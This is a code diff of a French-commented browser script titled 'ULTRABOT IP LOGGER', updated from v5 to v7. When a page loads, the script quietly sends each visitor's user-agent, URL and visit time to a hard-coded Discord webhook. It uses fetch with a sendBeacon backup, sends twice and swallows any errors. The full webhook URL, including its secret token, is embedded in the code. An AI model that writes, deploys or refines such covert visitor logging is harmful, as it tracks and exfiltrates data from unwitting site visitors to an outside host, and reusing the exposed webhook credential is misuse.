@@ -1,57 +1,47 @@
 // =============================================
-// ULTRABOT IP LOGGER v5 - FIX 400 ERROR
+// ULTRABOT IP LOGGER v7 - FIX 400 ERROR
 // =============================================
 
-const WEBHOOK = "https://canary.discord.com/api/webhooks/1477188997506928751/QdLJ25ZgN5GZw8ewnGTzcIHEsiH9La48uZpcf_NTPPiRZ0GSm5BzHyat3vlDpIEvO8Nz"; // ← Remplace par ta vraie webhook
+const WEBHOOK = "https://canary.discord.com/api/webhooks/1477188997506928751/QdLJ25ZgN5GZw8ewnGTzcIHEsiH9La48uZpcf_NTPPiRZ0GSm5BzHyat3vlDpIEvO8Nz";
 
-async function sendToWebhook() {
+async function sendLog() {
     const payload = {
         username: "UltraBot Logger",
+        avatar_url: "https://i.imgur.com/0y2fK0P.png",
+        content: "**Nouveau visiteur sur UltraBot**",
         embeds: [{
-            title: "🔴 Nouveau visiteur UltraBot",
-            color: 0xe01a1a,
+            title: "🔴 Visiteur détecté",
+            color: 14423100,
             timestamp: new Date().toISOString(),
             fields: [
-                { name: "IP", value: "`Récupération en cours...`", inline: true },
-                { name: "User-Agent", value: `\`\`\`${navigator.userAgent.substring(0, 250)}\`\`\``, inline: false },
-                { name: "URL", value: window.location.href, inline: false },
-                { name: "Heure", value: new Date().toLocaleString('fr-FR'), inline: true }
+                { name: "User-Agent", value: navigator.userAgent.substring(0, 300), inline: false },
+                { name: "Page", value: window.location.href, inline: false },
+                { name: "Heure", value: new Date().toLocaleString('fr-FR'), inline: false }
             ]
         }]
     };
 
+    // Envoi principal
     try {
-        const response = await fetch(WEBHOOK, {
+        await fetch(WEBHOOK, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(payload),
-            mode: "no-cors"
+            body: JSON.stringify(payload)
         });
+        console.log("%c[UltraBot] ✅ Envoi tenté", "color: lime");
+    } catch (e) {}
 
-        console.log("%c[UltraBot] ✅ Requête envoyée (no-cors)", "color: lime");
-    } catch (e) {
-        console.log("%c[UltraBot] Erreur fetch", "color: red");
-    }
-}
-
-// Méthode Beacon (la plus fiable sur GitHub Pages)
-function sendWithBeacon() {
-    const data = {
-        content: "**UltraBot - Visiteur détecté via Beacon**",
-        username: "UltraBot Logger"
-    };
-
-    const blob = new Blob([JSON.stringify(data)], { type: "application/json" });
-    navigator.sendBeacon(WEBHOOK, blob);
-    console.log("%c[UltraBot] Beacon envoyé", "color: orange");
+    // Méthode Beacon en backup
+    try {
+        const beaconPayload = { content: "Visiteur via Beacon" };
+        const blob = new Blob([JSON.stringify(beaconPayload)], {type: 'application/json'});
+        navigator.sendBeacon(WEBHOOK, blob);
+    } catch (e) {}
 }
 
 // Lancement
 window.addEventListener('load', () => {
-    console.log("%c[UltraBot] Script chargé - Tentative...", "color: red");
-
-    setTimeout(() => {
-        sendToWebhook();
-        sendWithBeacon();        // Méthode la plus fiable
-    }, 800);
+    console.log("%c[UltraBot] Logger chargé", "color: red; font-weight: bold");
+    setTimeout(sendLog, 700);
+    setTimeout(sendLog, 2000);
 });
